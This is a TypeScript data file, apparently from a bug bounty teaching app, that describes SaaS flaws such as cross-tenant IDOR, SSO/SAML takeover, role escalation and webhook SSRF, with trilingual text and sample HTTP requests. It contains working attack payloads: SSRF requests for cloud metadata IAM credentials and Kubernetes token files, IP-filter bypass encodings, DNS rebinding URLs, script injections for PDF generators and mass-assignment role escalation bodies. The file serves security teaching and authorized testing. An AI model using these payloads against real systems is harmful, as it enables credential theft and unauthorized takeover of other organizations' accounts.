import type { Lang } from "./types";

export interface SaaSVulnScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  requestSample?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface SaaSVulnClass {
  id: string;
  title: Record<Lang, string>;
  cwe: string;
  vrt: string;
  bountyRange: string;
  severity: "critical" | "high" | "medium";
  summary: Record<Lang, string>;
  scenarios: SaaSVulnScenario[];
  testingRecipe: Record<Lang, string>[];
  burpRules: string[];
  hunterProTip: Record<Lang, string>;
}

export interface SaaSPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface SaaSToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "autorize" | "race_condition" | "ssrf" | "saml_sso";
  code: string;
  language: "python" | "javascript" | "json" | "bash";
  howToUse: Record<Lang, string>;
}

export interface SaaSReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "critical" | "high";
  reportMarkdown: string;
}

// ─── 1. TOP HIGH-YIELD SAAS VULNERABILITY CLASSES ────────────────────────────
export const SAAS_VULN_CLASSES: SaaSVulnClass[] = [
  {
    id: "multi-tenant-bola",
    title: {
      en: "Multi-Tenancy Isolation Failure & Cross-Tenant BOLA/IDOR",
      simple: "Access Other Companies' Private SaaS Data by Changing IDs",
      hi: "मल्टी-टेनेंसी आइसोलेशन फेलियर व क्रॉस-टेनेंट डेटा चोरी (BOLA/IDOR)",
    },
    cwe: "CWE-639: Authorization Bypass Through User-Controlled Key",
    vrt: "Server-Side Injection > Broken Object Level Authorization (BOLA)",
    bountyRange: "$3,000 – $15,000 (P1 / Critical)",
    severity: "critical",
    summary: {
      en: "Multi-tenant SaaS architectures partition data using tenant identifiers (org_id, workspace_id, company_uuid). When backend queries lack tenant scoping filters (e.g. WHERE id = ? AND tenant_id = ?), attackers can read or mutate competitor organizations' data, documents, customer PII, and financial records.",
      simple: "SaaS websites put multiple companies on one system. When you change an organization or workspace ID in your request, the server forgets to check if you belong to that company and leaks their secret files and customer data.",
      hi: "SaaS ऐप्स में हज़ारों कंपनियों का डेटा एक ही डेटाबेस में होता है। जब कोई यूज़र अपनी रिक्वेस्ट में org_id या workspace_id बदलकर किसी दूसरी कंपनी की ID डालता है, तो सर्वर टेनेंट ओनरशिप चेक करना भूल जाता है और दूसरी कंपनी का पूरा डेटा लीक कर देता है।",
    },
    scenarios: [
      {
        title: {
          en: "Cross-Tenant Document & Audit Log Exfiltration via org_id Manipulation",
          simple: "Reading Competitor Documents by Swapping org_id",
          hi: "org_id बदलकर दूसरी कंपनी के गुप्त डॉक्यूमेंट्स और ऑडिट लॉग्स डाउनलोड करना",
        },
        description: {
          en: "The attacker intercepts an export endpoint (`GET /api/v2/workspaces/{workspace_id}/export`) and substitutes their own workspace UUID with a target victim company's UUID discovered through public invite links or subdomain enumeration.",
          simple: "Attacker swaps their workspace ID with a target company's ID in the export request, downloading all their confidential files.",
          hi: "अटैकर अपनी कंपनी की workspace_id को हटाकर विक्टिम कंपनी की workspace_id डालता है और उनका पूरा डेटा एक्सपोर्ट कर लेता है।",
        },
        requestSample: `GET /api/v2/workspaces/8f3a9e21-d41a-4d90-b183-99cf112a884e/audit-logs?format=json HTTP/1.1
Host: app.cloudmatrix-saas.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI... (Attacker Tenant A Token)
X-Tenant-Slug: attacker-corp
Accept: application/json`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "workspace_id": "8f3a9e21-d41a-4d90-b183-99cf112a884e",
  "organization_name": "Target Fortune 500 Corp",
  "audit_records": [
    {"user": "ciso@target.com", "action": "SSO_CONFIG_MODIFIED", "ip": "198.51.100.4"},
    {"user": "finance@target.com", "action": "INVOICE_GENERATED", "amount": 128500.00}
  ]
}`,
        impact: {
          en: "Complete loss of confidentiality across the entire SaaS customer base; violates GDPR, SOC2 Type II, and ISO 27001 multi-tenancy requirements.",
          simple: "Anyone can read secret documents and financial audits of any company using the software.",
          hi: "पूरा मल्टी-टेनेंट डेटाबेस लीक हो जाता है। कोई भी अटैकर किसी भी कंपनी के प्राइवेट डेटा तक पहुँच सकता है।",
        },
      },
      {
        title: {
          en: "Tenant Parameter Pollution in GraphQL Mutations (Cross-Tenant Modification)",
          simple: "Changing Team Settings of Another Organization via GraphQL",
          hi: "GraphQL म्यूटेशन में टेनेंट ID बदलकर दूसरी कंपनी के रोल्स और सेटिंग्स बदलना",
        },
        description: {
          en: "GraphQL mutations often take `input: { workspaceId, role }` parameters. Even if the HTTP header carries Tenant A's token, the backend resolver blindly trusts the GraphQL argument `workspaceId: Tenant B`, overwriting Tenant B's permissions.",
          simple: "Sending another company's ID inside a GraphQL request allows you to add yourself as an admin in their workspace.",
          hi: "GraphQL म्यूटेशन में विक्टिम का workspaceId पास करके अटैker खुद को एडमिन रोल असाइन कर लेता है।",
        },
        requestSample: `POST /graphql HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer <Attacker_Tenant_A_User>
Content-Type: application/json

{
  "query": "mutation UpdateWorkspaceMember($input: UpdateMemberInput!) { updateMember(input: $input) { id role status } }",
  "variables": {
    "input": {
      "workspaceId": "target-enterprise-uuid-9921",
      "userId": "attacker-user-id-0012",
      "role": "OWNER"
    }
  }
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "updateMember": {
      "id": "attacker-user-id-0012",
      "role": "OWNER",
      "status": "ACTIVE"
    }
  }
}`,
        impact: {
          en: "Unauthorized full administrative takeover of victim tenant workspaces.",
          simple: "Take over any organization on the SaaS platform as full Owner.",
          hi: "दूसरी कंपनी के पूरे वर्कस्पेस पर अटैकर का पूर्ण नियंत्रण (Full Admin Takeover) हो जाता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Create two separate paid/trial organizations in the target SaaS: Org A (Attacker) and Org B (Victim).",
        simple: "1. Register two different test companies in the SaaS: Company A and Company B.",
        hi: "1. टार्गेट SaaS में दो अलग-अलग टेस्ट अकाउंट बनाएं: कंपनी A (अटैकर) और कंपनी B (विक्टिम)।",
      },
      {
        en: "2. In Org B, create high-privilege assets: a sensitive document, an API key, an invite token, and an invoice.",
        simple: "2. In Company B, create private items like an invoice or team document.",
        hi: "2. कंपनी B में कुछ प्राइवेट चीजें बनाएं जैसे इनवॉइस, सीक्रेट फ़ाइल, या API की।",
      },
      {
        en: "3. Copy the UUID/ID of Org B's assets, then in Burp Suite, replay Org A's HTTP requests substituting Org B's ID in URL paths, query parameters (`?org_id=`), request bodies, and headers (`X-Tenant-ID`).",
        simple: "3. Replace Company A's IDs with Company B's IDs in your requests and see if the server responds with 200 OK.",
        hi: "3. Burp Suite में कंपनी A की रिक्वेस्ट्स में कंपनी B की ID डालकर भेजें और देखें कि क्या 200 OK के साथ डेटा आता है।",
      },
      {
        en: "4. Test both READ (GET/query) and WRITE (POST/PUT/PATCH/DELETE/mutation) operations.",
        simple: "4. Test both viewing and deleting/editing other companies' data.",
        hi: "4. सिर्फ डेटा पढ़ने (GET) ही नहीं, बल्कि डिलीट (DELETE) और एडिट (PUT/PATCH) भी टेस्ट करें।",
      },
    ],
    burpRules: [
      "Use Burp extension 'Autorize' or 'AuthMatrix' configured with Org A session cookies while browsing as Org B.",
      "Check Match/Replace rules in Burp Proxy for automatic header substitution (e.g. replacing `X-Org-Id: A` with `X-Org-Id: B`).",
      "Look for hidden tenant identifiers in JWT claims (`tenant_id`, `org_uuid`, `tid`).",
    ],
    hunterProTip: {
      en: "Don't just test top-level objects like `/workspaces/{id}`. The highest-paying BOLA bugs exist on deeply nested secondary sub-resources such as `/workspaces/{id}/integrations/slack/tokens`, `/teams/{id}/billing/invoices/pdf`, and `/export/jobs/{id}/download`!",
      simple: "Look for nested URLs like /integrations/tokens or /invoices/pdf instead of main profile pages. Developers often forget permission checks on deep sub-pages!",
      hi: "सिर्फ मेन प्रोफाइल या सेटिंग्स पेज मत चेक करें। सबसे बड़े बाउंटियाँ डीप नेस्टेड एंडपॉइंट्स पर मिलती हैं, जैसे `/workspaces/{id}/integrations/slack/tokens` या `/billing/invoices/pdf`!",
    },
  },
  {
    id: "sso-saml-oauth-takeover",
    title: {
      en: "SSO, SAML & OAuth Tenant Account Takeover",
      simple: "Log into Any Enterprise Account via Single Sign-On Flaws",
      hi: "SSO, SAML और OAuth के ज़रिये टेनेंट अकाउंट टेकओवर (Pre-Account Hijacking)",
    },
    cwe: "CWE-287: Improper Authentication",
    vrt: "Server-Side Injection > Authentication Bypass > SAML/OAuth Flaw",
    bountyRange: "$5,000 – $20,000 (P1 / Critical)",
    severity: "critical",
    summary: {
      en: "Enterprise SaaS platforms rely on SAML 2.0 and OAuth/OIDC for Single Sign-On (Okta, Azure AD, Google Workspace). Vulnerabilities arise from unverified email auto-linking (pre-account takeover), SAML XML signature wrapping (XSW), missing AudienceRestriction validation, and lack of tenant isolation in multi-tenant IdP configurations.",
      simple: "Big companies use Single Sign-On (like Google or Okta) to log into SaaS tools. If the SaaS app connects accounts without checking email verification or allows signing up before SSO is turned on, attackers can hijack corporate accounts.",
      hi: "बड़ी कंपनियाँ Google Workspace, Okta या Microsoft SSO का इस्तेमाल करती हैं। अगर SaaS ऐप ईमेल वेरिफिकेशन चेक किए बिना अकाउंट लिंक कर लेता है या SAML रिस्पॉन्स के सिग्नेचर को ठीक से वैलिडेट नहीं करता, तो अटैकर किसी भी कंपनी के एडमिन अकाउंट में सीधे लॉगिन कर सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Pre-Account Takeover via Unverified Email Signup Before Enterprise SSO Enforcement",
          simple: "Creating Account with Target Corporate Email Before SSO Setup",
          hi: "टार्गेट कंपनी के SSO ऑन करने से पहले उनके ईमेल से अकाउंट बनाकर परमानेंट एक्सेस पाना",
        },
        description: {
          en: "The attacker registers a regular password account with `admin@victim-enterprise.com` on the public SaaS portal without email verification (or where verification isn't required immediately). When Victim Enterprise later enables SSO for `@victim-enterprise.com`, the SaaS merges the accounts. The attacker retains valid password/session access alongside the enterprise's SSO.",
          simple: "Register an account with victim's work email using a password. When the victim logs in via company SSO, the accounts merge and the attacker keeps access via their password.",
          hi: "अटैकर विक्टिम के कॉर्पोरेट ईमेल से पासवर्ड आधारित अकाउंट बनाता है। बाद में जब कंपनी SSO जोड़ती है, तो अकाउंट मर्ज हो जाता है और अटैकर अपने पुराने पासवर्ड से हमेशा लॉगिन कर सकता है।",
        },
        requestSample: `POST /api/v1/auth/signup HTTP/1.1
Host: saasapp.com
Content-Type: application/json

{
  "email": "ceo@targetcompany.com",
  "password": "Password123!#$",
  "first_name": "Executive",
  "last_name": "User"
}`,
        responseSample: `HTTP/1.1 201 Created
Set-Cookie: session_token=atk_sess_99182; Path=/; HttpOnly; Secure

{
  "user_id": "usr_99120",
  "email": "ceo@targetcompany.com",
  "status": "pending_verification"
}`,
        impact: {
          en: "Persistent backdoor into executive accounts, bypassing 2FA and corporate Identity Provider (Okta/Ping) access revocations.",
          simple: "Attacker has a secret backdoor into corporate accounts that corporate IT cannot revoke.",
          hi: "कंपनी के CEO/Admin अकाउंट में परमानेंट बैकडोर बन जाता है जिसे कंपनी की IT टीम भी ब्लॉक नहीं कर पाती।",
        },
      },
      {
        title: {
          en: "Multi-Tenant Google Workspace SSO Hosted Domain (`hd`) Parameter Bypass",
          simple: "Logging In with Any Personal Gmail into Corporate Tenant",
          hi: "Google SSO में `hd` डोमेन चेक न होने से पर्सनल @gmail से कंपनी में लॉगिन",
        },
        description: {
          en: "The SaaS application offers 'Sign in with Google' for `acme.saas.com`. When handling the Google OAuth callback, the backend validates the Google ID token but forgets to verify that the email domain matches the tenant's registered domain (`hd: 'acme.com'`). An attacker with a personal `@gmail.com` logs in and gets auto-provisioned into the victim's private workspace.",
          simple: "Sign in with a personal Gmail account and the app mistakenly adds you to an enterprise workspace because it forgot to check the domain suffix.",
          hi: "पर्सनल Gmail से लॉगिन करने पर बैकएंड सिर्फ यह चेक करता है कि टोकन वैलिड है या नहीं, लेकिन यह चेक नहीं करता कि ईमेल कंपनी के डोमेन (@acme.com) का है या नहीं।",
        },
        requestSample: `POST /api/v1/sso/google/callback HTTP/1.1
Host: acme-corp.saasapp.com
Content-Type: application/json

{
  "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
  "state": "tenant_acme_corp"
}`,
        responseSample: `HTTP/1.1 200 OK
Set-Cookie: saas_auth_session=corp_sess_abc123; Path=/; Secure; HttpOnly

{
  "authenticated": true,
  "tenant": "acme-corp",
  "role": "MEMBER",
  "welcome": "Welcome to Acme Corp Workspace!"
}`,
        impact: {
          en: "Any internet user with a free Gmail account can join confidential enterprise workspaces without an invitation.",
          simple: "Anyone with any Google account can enter the company's internal private workspace.",
          hi: "दुनिया का कोई भी यूज़र अपने फ्री Gmail अकाउंट से बिना किसी इनविटेशन के कंपनी के प्राइवेट वर्कस्पेस में घुस जाता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Check if signup allows setting a password without immediate email verification, or if OAuth linking overrides existing accounts without asking for current password.",
        simple: "1. Test if you can sign up with an email without clicking a verification link first.",
        hi: "1. टेस्ट करें कि क्या बिना ईमेल वेरिफिकेशन लिंक पर क्लिक किए सीधे पासवर्ड से अकाउंट बन जाता है।",
      },
      {
        en: "2. In SAML assertions (captured via SAML Raider Burp plugin), test XML Signature Wrapping (XSW1 through XSW8) to modify the NameID to another user's email while leaving the signature valid over a clone block.",
        simple: "2. Use Burp's SAML Raider extension to test signature bypass and change your username in the login packet.",
        hi: "2. Burp के SAML Raider प्लगइन से SAML रिस्पॉन्स कैप्चर करें और NameID में दूसरा ईमेल डालकर XML Signature Wrapping टेस्ट करें।",
      },
      {
        en: "3. If the SaaS offers Azure AD or Okta multi-tenant app integration, point the login to your own rogue Azure tenant and check if the victim SaaS accepts assertions issued by your tenant ID.",
        simple: "3. Log in using your own Microsoft Azure tenant and check if the victim app accepts it.",
        hi: "3. अपने खुद के टेस्ट Azure AD या Okta से टोकन जनरेट करके टार्गेट SaaS में भेजें और चेक करें कि क्या वो दूसरे टेनेंट का टोकन स्वीकार कर रहा है।",
      },
    ],
    burpRules: [
      "Install SAML Raider in Burp BApp Store for 1-click XML Signature Wrapping attacks.",
      "Monitor all OAuth callbacks for missing or static `state` parameters (CSRF login).",
      "Inspect JWT tokens for weak algorithm confusion (RS256 to HS256) signed with public key.",
    ],
    hunterProTip: {
      en: "Look for 'Just-In-Time' (JIT) SAML provisioning! When a user logs in via SSO for the first time, SaaS apps frequently auto-create accounts and assign roles based on SAML attributes like `Role` or `Groups`. Tampering with these attributes in the SAML response often yields instant SuperAdmin rights!",
      simple: "When companies auto-create accounts upon first SSO login (JIT Provisioning), try modifying the Role or Group attribute in the SAML packet to 'Admin' or 'SuperUser'!",
      hi: "SaaS ऐप्स में 'Just-In-Time (JIT)' प्रोविजनिंग को खास ध्यान से देखें! पहली बार SSO लॉगिन पर अगर आप SAML रिस्पॉन्स में `Groups` या `Role` एट्रिब्यूट को बदलकर `Admin` या `SuperAdmin` कर देते हैं, तो अक्सर सर्वर आपको सीधे सबसे बड़ा रोल दे देता है!",
    },
  },
  {
    id: "rbac-privilege-escalation",
    title: {
      en: "Vertical & Horizontal RBAC Bypass (Role Escalation Matrix)",
      simple: "Upgrade from Guest/Member to Admin or Modify Billing Without Permission",
      hi: "रोल-बेस्ड एक्सेस कंट्रोल (RBAC) बाईपास व प्रिविलेज एस्केलेशन",
    },
    cwe: "CWE-269: Improper Privilege Management",
    vrt: "Server-Side Injection > Privilege Escalation",
    bountyRange: "$2,000 – $8,000 (P1/P2)",
    severity: "high",
    summary: {
      en: "SaaS platforms enforce complex role hierarchies (Guest, Member, Manager, Admin, Billing Owner, SuperAdmin). Vulnerabilities occur when client-side UI hides admin buttons but backend REST/GraphQL endpoints do not validate whether the requesting user role possesses the required permission scope.",
      simple: "SaaS websites hide admin buttons from normal employees. But if a normal employee directly sends the secret admin API request, the server executes it because it forgot to check their rank.",
      hi: "SaaS ऐप्स में अलग-अलग रोल्स होते हैं (जैसे Guest, Member, Admin, Owner)। डेवलपर केवल UI में बटन छुपा देते हैं, लेकिन जब कोई साधारण Member सीधे Admin वाले API एंडपॉइंट पर रिक्वेस्ट भेजता है, तो बैकएंड बिना रोल चेक किए काम कर देता है।",
    },
    scenarios: [
      {
        title: {
          en: "Mass Assignment on Member Invitation Endpoint (Self-Promotion to Owner)",
          simple: "Inviting Yourself as an Owner by Adding 'role': 'owner' in JSON",
          hi: "इनवाइट रिक्वेस्ट में `role: owner` डालकर खुद को सीधे सबसे बड़ा रोल देना (Mass Assignment)",
        },
        description: {
          en: "A standard `Member` is permitted to invite collaborators with default `VIEWER` access. By intercepting the invitation POST request and adding `\"role\": \"OWNER\"` or `\"is_admin\": true`, the backend deserializes the property directly into the database model without a whitelist filter.",
          simple: "When inviting a friend as a viewer, change the role field in the background request to 'owner' or 'admin'.",
          hi: "नॉर्मल यूज़र किसी को इनवाइट भेजते समय रिक्वेस्ट में `role: owner` जोड़ देता है और बैकएंड बिना वैलिडेशन के उसे ओनर बना देता है।",
        },
        requestSample: `POST /api/v1/workspaces/ws_4410/invitations HTTP/1.1
Host: clouddesk.io
Authorization: Bearer <Regular_Member_Token>
Content-Type: application/json

{
  "email": "attacker-alias@gmail.com",
  "team_id": "team_alpha",
  "role": "OWNER",
  "permissions": ["all", "billing:write", "users:delete"],
  "is_admin": true
}`,
        responseSample: `HTTP/1.1 201 Created
Content-Type: application/json

{
  "invitation_id": "inv_88412",
  "email": "attacker-alias@gmail.com",
  "role": "OWNER",
  "status": "sent"
}`,
        impact: {
          en: "Complete vertical privilege escalation from lowest-privilege member to workspace Owner with full destructive permissions.",
          simple: "Any low-level employee can become the ultimate boss of the workspace.",
          hi: "सबसे कम रोल वाला यूज़र कंपनी के पूरे वर्कस्पेस का ओनर बन जाता है और असली ओनर को भी डिलीट कर सकता है।",
        },
      },
      {
        title: {
          en: "Horizontal Role Matrix Bypass on Billing Payment Method Removal",
          simple: "Non-Billing Member Modifying or Deleting Corporate Credit Card",
          hi: "बिना बिलिंग परमिशन वाला सदस्य कंपनी के क्रेडिट कार्ड को बदलना या हटाना",
        },
        description: {
          en: "The SaaS product creates dedicated sub-roles like `Developer` and `Billing Admin`. A Developer sends a direct `DELETE /api/v1/billing/payment-methods/{pm_id}` request. The backend verifies the user belongs to the workspace, but fails to check if their granular role includes `billing:manage`.",
          simple: "A regular developer can delete the company's credit card and shut down their account services.",
          hi: "एक सामान्य डेवलपर कंपनी के पेमेंट मेथड और क्रेडिट कार्ड को डिलीट कर देता है, जिससे कंपनी की सारी सर्विसेज बंद हो जाती हैं।",
        },
        requestSample: `DELETE /api/v1/billing/payment-methods/pm_visa_9918 HTTP/1.1
Host: saasapp.io
Authorization: Bearer <Standard_Developer_Token>
X-Requested-With: XMLHttpRequest`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "deleted": true,
  "message": "Payment method successfully detached."
}`,
        impact: {
          en: "Denial of service and business disruption for enterprise customers by unauthorized users altering billing configurations.",
          simple: "Disrupts company business by messing with corporate billing without authorization.",
          hi: "बिज़नेस में बाधा (Denial of Service) पैदा होती है क्योंकि गैर-अधिकृत सदस्य कंपनी की बिलिंग सेटिंग्स बिगाड़ सकता है।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Create an exact matrix of every role in the workspace: Owner, Admin, Member, Guest/Viewer.",
        simple: "1. List all roles available in the SaaS app.",
        hi: "1. वर्कस्पेस में उपलब्ध सभी रोल्स (Owner, Admin, Member, Guest) की लिस्ट बनाएं।",
      },
      {
        en: "2. Log in as Owner in Browser 1 and perform every sensitive administrative action (invite user, change SSO, delete project, export data, manage billing). Save all requests in Burp.",
        simple: "2. Perform admin actions as the Owner and save the HTTP requests in Burp Suite.",
        hi: "2. Browser 1 में ओनर बनकर सारे एडमिन काम करें (जैसे इनवाइट, बिलिंग, डिलीट) और Burp में रिक्वेस्ट्स रिकॉर्ड करें।",
      },
      {
        en: "3. In Burp Repeater, replace the Owner session token with the Member or Guest token. Replay each request.",
        simple: "3. Replace the Owner token with a Member or Guest token and re-send the requests.",
        hi: "3. Burp Repeater में ओनर के टोकन की जगह साधारण Member या Guest का टोकन डालकर रिक्वेस्ट दोबारा भेजें।",
      },
      {
        en: "4. If any administrative action returns 200 OK or 204 No Content instead of 403 Forbidden, you have a validated P1/P2 privilege escalation!",
        simple: "4. If you get 200 OK instead of 403 Forbidden, you found a privilege escalation bug!",
        hi: "4. अगर 403 Forbidden की जगह 200 OK आता है, तो आपका P1/P2 प्रिविलेज एस्केलेशन बग कन्फर्म है!",
      },
    ],
    burpRules: [
      "Use Burp Autorize extension: Set Low-Privileged Member Cookie in Configuration, turn Autorize ON, and browse as Admin in the browser.",
      "Filter for responses where Autorize marks 'Bypassed!' in red/orange.",
      "Test changing HTTP verbs (e.g. POST -> PUT, GET -> POST, or using X-HTTP-Method-Override: PUT).",
    ],
    hunterProTip: {
      en: "Always inspect the user onboarding and invitation flows! When an Admin invites a new user, check if the invite token endpoint (`GET /api/invitations/{token}`) reveals sensitive organization metadata, or if accepting the invitation with a modified role parameter (`{\"accepted_role\": \"admin\"}`) overrides the invited role!",
      simple: "Check the invitation link accepting flow! When accepting an invitation, try changing the role in the accept request to 'admin'!",
      hi: "इनविटेशन एक्सेप्ट करने वाले फ्लो को कभी न छोड़ें! जब आप इनवाइट लिंक पर क्लिक करके एक्सेप्ट करते हैं, तो उस फाइनल POST रिक्वेस्ट में `role: admin` भेजकर देखें कि क्या सर्वर आपको एडमिन बना देता है!",
    },
  },
  {
    id: "webhook-ssrf-cloud-metadata",
    title: {
      en: "Outbound Webhooks & Integration SSRF (Cloud Metadata Theft)",
      simple: "Force the SaaS Server to Hack Its Own Internal Cloud Network via Webhooks",
      hi: "आउटबाउंड वेबहुक्स और इंटीग्रेशन SSRF (AWS/GCP क्लाउड क्रेडेंशियल्स की चोरी)",
    },
    cwe: "CWE-918: Server-Side Request Forgery (SSRF)",
    vrt: "Server-Side Injection > Server-Side Request Forgery (SSRF) > Full SSRF",
    bountyRange: "$4,000 – $25,000 (P1 / Critical)",
    severity: "critical",
    summary: {
      en: "Modern SaaS platforms allow customers to configure outbound webhooks (event notifications, Slack/Jira integrations, Zapier endpoints). When the server makes HTTP requests to user-supplied URLs without restricting private IP ranges (RFC 1918) and cloud metadata services (169.254.169.254), attackers can steal AWS IAM role tokens, query Kubernetes cluster APIs, and pivot into the internal infrastructure.",
      simple: "SaaS apps let you type in a URL to receive notifications (webhooks). If you put internal addresses like cloud metadata (169.254.169.254), the SaaS server queries its own secret cloud keys and sends them back to you.",
      hi: "SaaS ऐप्स में इवेंट्स के लिए वेबहुक URL डालने का फ़ीचर होता है (जैसे Slack या Zapier नोटिफिकेशन)। अगर सर्वर आपके दिए URL पर बिना प्राइवेट IP फ़िल्टर किए रिक्वेस्ट भेजता है, तो अटैकर AWS मेटाडेटा (169.254.169.254) या इंटरनल कुबेरनेट्स क्लस्टर के सीक्रेट्स चुरा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Full SSRF on Webhook 'Test Endpoint' Feature Leaking AWS EC2 IAM Credentials",
          simple: "Using 'Test Webhook' Button to Steal AWS IAM Cloud Keys",
          hi: "वेबहुक के 'Test Endpoint' बटन से AWS IAM रोल क्रेडेंशियल्स चुराना",
        },
        description: {
          en: "The SaaS settings page provides a 'Send Test Webhook' button. The attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the webhook URL. The backend executes an HTTP GET request to the instance metadata service and displays the HTTP response body in the UI preview modal.",
          simple: "Put the AWS metadata IP in the webhook test field and click Test. The server shows you the cloud server's secret login keys in the preview box.",
          hi: "वेबहुक टेस्ट फ़ील्ड में AWS मेटाडेटा IP डालकर टेस्ट बटन दबाते हैं, और सर्वर अपनी सीक्रेट क्लाउड कीज़ UI के प्रीव्यू बॉक्स में दिखा देता है।",
        },
        requestSample: `POST /api/v1/integrations/webhooks/test HTTP/1.1
Host: saas-core.app.com
Authorization: Bearer <Customer_Token>
Content-Type: application/json

{
  "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-saas-worker-role",
  "http_method": "GET",
  "include_headers": true
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status_code": 200,
  "response_headers": {"Server": "EC2ws"},
  "response_body": {
    "Code": "Success",
    "AccessKeyId": "ASIAQABCDE1234567890",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "IQoJb3JpZ2luX2VjE...",
    "Expiration": "2026-10-22T20:45:00Z"
  }
}`,
        impact: {
          en: "Full compromise of the SaaS hosting infrastructure, databases, and customer storage buckets via stolen cloud provider credentials.",
          simple: "Attacker gets the keys to the entire cloud infrastructure hosting all customers.",
          hi: "पूरे क्लाउड इंफ्रास्ट्रक्चर (AWS/GCP) का एक्सेस मिल जाता है, जिससे सारा डेटाबेस और कस्टमर डेटा कॉम्प्रोमाइज़ हो जाता है।",
        },
      },
      {
        title: {
          en: "Blind SSRF with DNS Rebinding to Bypass Private IP Blacklists",
          simple: "Bypassing Private IP Filters Using DNS Rebinding",
          hi: "DNS रीबाइंडिंग के ज़रिये प्राइवेट IP फ़िल्टर्स को बाईपास करना",
        },
        description: {
          en: "The SaaS server validates that the webhook domain does not resolve to `127.0.0.1` or `10.0.0.0/8` during the initial check. However, it resolves the domain a second time during the actual fetch. By using a DNS rebinding service (TTL=0s), the first resolution returns a public IP, and the second returns `169.254.169.254`.",
          simple: "A clever domain changes its address from public to private in milliseconds, tricking the server's security filter.",
          hi: "एक विशेष डोमेन पहली बार में पब्लिक IP दिखाता है (फ़िल्टर पास करने के लिए) और दूसरी बार में इंटरनल IP पर रीबाइंड हो जाता है।",
        },
        requestSample: `POST /api/v1/notifications/webhook HTTP/1.1
Host: saas-core.app.com
Authorization: Bearer <Customer_Token>
Content-Type: application/json

{
  "webhook_url": "http://7f000001.c0a80001.rbndr.us/api/v1/internal/admin",
  "events": ["user.created"]
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "webhook_id": "wh_77182",
  "status": "active"
}`,
        impact: {
          en: "Pivoting into private VPC microservices and internal admin APIs without network boundary enforcement.",
          simple: "Allows accessing hidden internal company services from the outside.",
          hi: "कंपनी के इंटरनल प्राइवेट नेटवर्क (VPC) के अंदर मौजूद छुपे हुए एडमिन टूल्स पर सीधे हमले किए जा सकते हैं।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "1. Locate every feature where the SaaS fetches a remote resource: Webhooks, Profile avatars from URL, PDF invoice generators, Slack/Zapier integrations, RSS feeds, and URL preview link unfurling.",
        simple: "1. Find any feature where you can type a URL that the server visits (avatar, PDF, webhook).",
        hi: "1. ऐप में वो हर फ़ीचर खोजें जहाँ सर्वर किसी URL को लोड करता है: जैसे वेबहुक, अवतार URL, PDF जनरेटर, लिंक प्रीव्यू।",
      },
      {
        en: "2. Set up an Interactsh, Burp Collaborator, or webhook.site listener and enter your listener URL to confirm outbound HTTP requests.",
        simple: "2. Put your Burp Collaborator or webhook.site URL to see if the server contacts you.",
        hi: "2. Burp Collaborator या webhook.site का लिंक डालकर चेक करें कि क्या सर्वर से पिंग आती है।",
      },
      {
        en: "3. If the server validates and blocks `169.254.169.254` or `127.0.0.1`, test bypasses: decimal (`http://2852039166`), hex (`http://0xa9fea9fe`), IPv6 (`http://[::ffff:169.254.169.254]`), and HTTP 302 Open Redirects from your own domain.",
        simple: "3. If private IPs are blocked, try alternate number formats like hex or an open redirect.",
        hi: "3. अगर प्राइवेट IP ब्लॉक हैं, तो डेसीमल, हेक्स या अपने सर्वर से 302 रीडायरेक्ट का उपयोग करके बाईपास करें।",
      },
      {
        en: "4. For blind SSRF, monitor HTTP request headers sent by the server to identify cloud provider signatures (`X-Amz-Security-Token`, User-Agent, internal hostnames).",
        simple: "4. Look at the User-Agent and headers the server sends to know what cloud it uses.",
        hi: "4. सर्वर द्वारा भेजी गई रिक्वेस्ट के हेडर (User-Agent आदि) देखकर पहचानें कि वो AWS, Google Cloud या Azure पर है।",
      },
    ],
    burpRules: [
      "Use Burp Collaborator / Interactsh for all webhook testing to detect delayed/asynchronous background queue executions.",
      "Test AWS IMDSv2 bypass: If IMDSv1 is disabled, test if the application allows adding custom headers (e.g. `X-aws-ec2-metadata-token-ttl-seconds: 21600`) or PUT requests.",
      "Check PDF generators for `<iframe src=\"http://169.254.169.254/latest/meta-data/\">` or `<script>x=new XMLHttpRequest;x.open('GET','http://169.254.169.254');...</script>`.",
    ],
    hunterProTip: {
      en: "Don't stop at AWS metadata! Many modern SaaS apps run in Kubernetes. Always test `https://kubernetes.default.svc/api/v1` or check for the pod service account token at `file:///var/run/secrets/kubernetes.io/serviceaccount/token` via file protocol SSRF!",
      simple: "Modern SaaS apps run on Kubernetes! Try loading internal Kubernetes cluster addresses or reading the service account token file!",
      hi: "सिर्फ AWS मेटाडेटा तक मत रुकिए! आज के ज़्यादातर SaaS ऐप्स Kubernetes पर चलते हैं। हमेशा `https://kubernetes.default.svc` और `file:///var/run/secrets/kubernetes.io/serviceaccount/token` को भी टेस्ट करें!",
    },
  },
  {
    id: "api-token-ghost-access",
    title: {
      en: "API Token Ghost Access & Scoped Key Privilege Abuse",
      simple: "Ex-Employees Retaining Permanent Access via Lingering API Keys",
      hi: "घोस्ट API टोकन व स्कोप्ड कीज (कंपनी छोड़ने के बाद भी परमानेंट एक्सेस)",
    },
